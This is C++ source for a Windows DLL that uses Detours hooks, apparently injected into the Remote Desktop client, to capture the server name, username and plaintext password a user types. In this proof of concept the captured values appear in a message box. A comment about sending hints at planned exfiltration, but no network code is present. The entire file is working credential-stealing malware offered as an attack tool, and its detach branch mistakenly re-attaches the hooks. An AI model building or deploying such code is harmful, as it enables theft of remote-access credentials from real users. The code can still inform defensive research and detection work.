#include <Windows.h>
#include <VersionHelpers.h>
#include <string>

#include "Detours_x64/detours.h"
#include "HookedHelpers.h"

#pragma comment(lib, "Detours_x64/detours.lib")
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "crypt32.lib")

__declspec(dllexport) BOOL WINAPI HookedCredRead(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIAL* Credential)
{
	RemoteDesktop.lpServerAddress = TargetName;
	return True_CredRead(TargetName, Type, Flags, Credential);
}

__declspec(dllexport) SECURITY_STATUS WINAPI HookedSspiPrepareForCredRead(PSEC_WINNT_AUTH_IDENTITY_OPAQUE AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR* ppszCredmanTargetName)
{
	RemoteDesktop.lpServerAddress = pszTargetName;
	return True_SspiPrepareForCredRead(AuthIdentity, pszTargetName, pCredmanCredentialType, ppszCredmanTargetName);
}

__declspec(dllexport) BOOL WINAPI HookedCryptProtectMemory(LPVOID pDataIn, DWORD cbDataIn, DWORD dwFlags)
{
	DWORD cbPass = 0;
	LPVOID lpPassword = NULL;

	int* ptr = (int*)pDataIn;
	LPVOID lpPasswordAddress = ptr + 1;
	memcpy(&cbPass, pDataIn, 4);

	if (cbPass > 2)
	{
		size_t written = 0;
		lpPassword = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
		WriteProcessMemory(GetCurrentProcess(), lpPassword, lpPasswordAddress, cbPass, &written);
		RemoteDesktop.lpPassword = static_cast<LPCWSTR>(lpPassword);
	}
	return True_CryptProtectMemory(pDataIn, cbDataIn, dwFlags);
}

__declspec(dllexport) BOOL WINAPI HookedCredIsMarshaledCredential(LPCWSTR MarshaledCredential)
{
	RemoteDesktop.lpUsername = MarshaledCredential;

	if (!RemoteDesktop.lpServerAddress.empty() && !RemoteDesktop.lpUsername.empty() && !RemoteDesktop.lpPassword.empty())
	{
		std::wstring lpBuffer = L"Server: " + RemoteDesktop.lpServerAddress + L"\n";
		lpBuffer += L"Username: " + RemoteDesktop.lpUsername + L"\n";
		lpBuffer += L"Password: " + RemoteDesktop.lpPassword + L"\n";

		MessageBox(NULL, lpBuffer.c_str(), L"Just a PoC, not final", MB_OK);

		// Clean up the struct so it won't constantly send anything
		RemoteDesktop.lpServerAddress.clear();
		RemoteDesktop.lpUsername.clear();
		RemoteDesktop.lpPassword.clear();
	}
	return True_CredIsMarshaledCredential(MarshaledCredential);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	LONG status = 0;

	if (DetourIsHelperProcess())
	{
		return TRUE;
	}

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		status = DetourTransactionBegin();
		if (status == ERROR_INVALID_OPERATION)
		{
			MessageBox(NULL, L"Failed at DetourTransactionBegin!", NULL, MB_ICONERROR);
			return FALSE;
		}

		status = DetourUpdateThread(GetCurrentThread());
		if (status != NO_ERROR)
		{
			MessageBox(NULL, L"Failed at DetourUpdateThread!", NULL, MB_ICONERROR);
			return FALSE;
		}

		if (IsWindows8OrGreater())
		{
			status = DetourAttach(&(PVOID&)True_SspiPrepareForCredRead, HookedSspiPrepareForCredRead);
			if (status != NO_ERROR)
			{
				MessageBox(NULL, L"Failed at DetourAttach for SspiPrepareForCredRead!", NULL, MB_ICONERROR);
				return FALSE;
			}
		}
		else
		{
			status = DetourAttach(&(PVOID&)True_CredRead, HookedCredRead);
			if (status != NO_ERROR)
			{
				MessageBox(NULL, L"Failed at DetourAttach for CredRead!", NULL, MB_ICONERROR);
				return FALSE;
			}
		}

		status = DetourAttach(&(PVOID&)True_CryptProtectMemory, HookedCryptProtectMemory);
		if (status != NO_ERROR)
		{
			MessageBox(NULL, L"Failed at DetourAttach for CryptProtectMemory!", NULL, MB_ICONERROR);
			return FALSE;
		}

		status = DetourAttach(&(PVOID&)True_CredIsMarshaledCredential, HookedCredIsMarshaledCredential);
		if (status != NO_ERROR)
		{
			MessageBox(NULL, L"Failed at DetourAttach for CredIsMarshaledCredential!", NULL, MB_ICONERROR);
			return FALSE;
		}

		status = DetourTransactionCommit();
		if (status != NO_ERROR)
		{
			MessageBox(NULL, L"Failed at DetourTransactionCommit!", NULL, MB_ICONERROR);
			return FALSE;
		}
		break;
	case DLL_PROCESS_DETACH:
		status = DetourTransactionBegin();
		if (status == ERROR_INVALID_OPERATION)
		{
			MessageBox(NULL, L"Failed at DetourTransactionBegin!", NULL, MB_ICONERROR);
			return FALSE;
		}

		status = DetourUpdateThread(GetCurrentThread());
		if (status != NO_ERROR)
		{
			MessageBox(NULL, L"Failed at DetourUpdateThread!", NULL, MB_ICONERROR);
			return FALSE;
		}

		if (IsWindows8OrGreater())
		{
			status = DetourAttach(&(PVOID&)True_SspiPrepareForCredRead, HookedSspiPrepareForCredRead);
			if (status != NO_ERROR)
			{
				MessageBox(NULL, L"Failed at DetourAttach for SspiPrepareForCredRead!", NULL, MB_ICONERROR);
				return FALSE;
			}
		}
		else
		{
			status = DetourAttach(&(PVOID&)True_CredRead, HookedCredRead);
			if (status != NO_ERROR)
			{
				MessageBox(NULL, L"Failed at DetourAttach for CredRead!", NULL, MB_ICONERROR);
				return FALSE;
			}
		}

		status = DetourAttach(&(PVOID&)True_CryptProtectMemory, HookedCryptProtectMemory);
		if (status != NO_ERROR)
		{
			MessageBox(NULL, L"Failed at DetourAttach for CryptProtectMemory!", NULL, MB_ICONERROR);
			return FALSE;
		}

		status = DetourAttach(&(PVOID&)True_CredIsMarshaledCredential, HookedCredIsMarshaledCredential);
		if (status != NO_ERROR)
		{
			MessageBox(NULL, L"Failed at DetourAttach for CredIsMarshaledCredential!", NULL, MB_ICONERROR);
			return FALSE;
		}

		status = DetourTransactionCommit();
		if (status != NO_ERROR)
		{
			MessageBox(NULL, L"Failed at DetourTransactionCommit!", NULL, MB_ICONERROR);
			return FALSE;
		}
		break;
	}
	return TRUE;
}